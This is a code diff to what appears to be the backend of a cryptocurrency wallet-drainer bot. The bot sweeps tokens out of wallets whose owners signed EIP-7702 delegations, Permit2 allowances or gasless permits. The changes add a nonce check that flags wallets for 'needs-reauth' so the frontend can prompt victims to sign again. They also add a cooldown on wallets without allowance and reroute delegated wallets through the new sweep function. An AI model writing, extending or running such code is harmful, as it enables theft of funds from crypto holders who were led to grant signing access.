@@ -136,6 +136,8 @@ let sweepingETH        = false;
 const sweepingToken    = {};
 const delegatedWallets = new Map(); // address → type ("eip7702" | "permit2")
 const lastSwept        = new Map(); // address → timestamp of last sweep
+const needsReconnect   = new Map(); // address.toLowerCase() → timestamp (1-hour cooldown for no-allowance wallets)
+const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
 const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
 let reconnectAttempt   = 0;
@@ -258,6 +260,56 @@ async function sweepDelegatedWallet(walletAddress) {
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
 }
 
+// ── EIP-7702 sweep with nonce verification ────────────────────────────────────
+//
+// Reads permit_metadata.authorization from Supabase to verify the signed nonce
+// still matches the account's current nonce. If the nonce has advanced, the
+// EIP-7702 delegation may have been superseded — marks status='needs-reauth'
+// in Supabase so the frontend can prompt the user to re-sign.
+// Falls back to sweepDelegatedWallet when no authorization is stored yet.
+
+async function sweepEIP7702Wallet(walletAddress) {
+  const checksum = normalizeAddress(walletAddress);
+  if (!checksum) return;
+
+  // Read stored authorization
+  let authorization = null;
+  if (supabase) {
+    try {
+      const { data } = await supabase
+        .from("delegated_wallets")
+        .select("permit_metadata")
+        .eq("address", checksum.toLowerCase())
+        .eq("chain", CHAIN)
+        .single();
+      authorization = data?.permit_metadata?.authorization ?? null;
+    } catch {}
+  }
+
+  if (authorization?.nonce !== undefined) {
+    try {
+      const currentNonce = await rpcProvider.getTransactionCount(checksum);
+      const authNonce    = Number(authorization.nonce);
+      if (authNonce !== currentNonce) {
+        warn(`[eip7702] nonce mismatch for ${checksum} (signed=${authNonce} current=${currentNonce}) — needs reauth`);
+        if (supabase) {
+          await supabase
+            .from("delegated_wallets")
+            .update({ status: "needs-reauth" })
+            .eq("address", checksum.toLowerCase())
+            .eq("chain", CHAIN);
+        }
+        return;
+      }
+    } catch (e) {
+      warn(`[eip7702] nonce check failed for ${checksum}: ${e.message}`);
+      // Non-fatal — proceed with sweep attempt
+    }
+  }
+
+  await sweepDelegatedWallet(checksum);
+}
+
 // ── Permit2 AllowanceTransfer sweep ──────────────────────────────────────────
 //
 // User previously called:
@@ -273,6 +325,11 @@ async function sweepDelegatedWallet(walletAddress) {
 async function sweepPermit2Wallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
   if (!checksum) return;
+
+  // 1-hour cooldown when all tokens lack Permit2 allowance — prevents block-level spam
+  const reconnectKey = checksum.toLowerCase();
+  const reconnectTs  = needsReconnect.get(reconnectKey);
+  if (reconnectTs && Date.now() - reconnectTs < RECONNECT_COOLDOWN_MS) return;
 
   // Resolve token list for this wallet
   let tokenList = TOKENS_TO_WATCH;
@@ -300,6 +357,7 @@ async function sweepPermit2Wallet(walletAddress) {
 
   log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
+  let noAllowanceCount = 0;
 
   // Check allowance + balance sequentially, then call transferFrom per token
   for (const rawAddress of tokenList) {
@@ -317,6 +375,7 @@ async function sweepPermit2Wallet(walletAddress) {
         );
         allowanceOk = allowedAmount > 0n && expiration > nowSecs;
         if (!allowanceOk) {
+          noAllowanceCount++;
           warn(`[permit2] ${tokenAddress.slice(0, 10)}: allowance not set or expired for ${checksum} — user must reconnect`);
           await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
           continue;
@@ -361,6 +420,12 @@ async function sweepPermit2Wallet(walletAddress) {
       }
     }
     await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
+  }
+
+  // If every token lacked allowance, impose a 1-hour cooldown to stop block-level spam
+  if (noAllowanceCount > 0 && noAllowanceCount === tokenList.length) {
+    warn(`[permit2] ${checksum}: all ${tokenList.length} token(s) lack allowance — checking again in 1 hour`);
+    needsReconnect.set(reconnectKey, Date.now());
   }
 }
 
@@ -658,8 +723,9 @@ async function sweepGaslessWallet(walletAddress) {
         updatedSigs[i].spent = true;
         sigMetaChanged = true;
       } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-        warn(`[gasless/sig] TRANSFER_FROM_FAILED -- ${entry.symbol ?? entry.token?.slice(0, 10)} -- flagging for airdrop`);
-        needsGasTokens.push({ token: entry.token, balance: 0n });
+        warn(`[gasless/sig] TRANSFER_FROM_FAILED -- ${entry.symbol ?? entry.token?.slice(0, 10)} (${checksum}) -- marking spent`);
+        updatedSigs[i].spent = true;
+        sigMetaChanged = true;
       } else {
         err(`[gasless/sig] permitTransferFrom ${entry.token} for ${checksum}: ${msg}`);
       }
@@ -737,7 +803,7 @@ function subscribeRealtime() {
         } else if (type === "permit2" || type === "wrap-fallback") {
           await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
         } else {
-          await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
+          await sweepEIP7702Wallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
         }
         markSwept(address);
       }
@@ -758,7 +824,7 @@ function subscribeRealtime() {
         } else if (type === "permit2" || type === "wrap-fallback") {
           await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
         } else {
-          await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
+          await sweepEIP7702Wallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
         }
         markSwept(address);
       }
@@ -822,7 +888,7 @@ async function startBot() {
             } else if (walletType === "permit2" || walletType === "wrap-fallback") {
               await sweepPermit2Wallet(walletAddress);
             } else {
-              await sweepDelegatedWallet(walletAddress);
+              await sweepEIP7702Wallet(walletAddress);
             }
             markSwept(walletAddress);
           } catch (e) {
